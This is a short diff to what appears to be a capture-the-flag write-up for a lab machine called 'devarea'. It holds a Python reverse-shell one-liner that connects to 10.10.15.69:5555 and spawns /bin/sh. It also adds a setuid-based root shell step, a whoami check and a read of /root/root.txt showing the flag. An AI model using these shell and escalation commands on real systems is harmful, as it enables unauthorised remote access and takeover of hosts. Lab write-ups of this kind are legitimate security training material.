@@ -256,3 +256,16 @@ User dev_ryan may run the following commands on devarea:
 ```
 python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.15.69",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 ```
+
+
+```
+$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# whoami
+whoami
+root
+# cat /root/root.txt
+cat /root/root.txt
+d7067b9d4a5321eb2fb8b40d73893e2c
+```
+
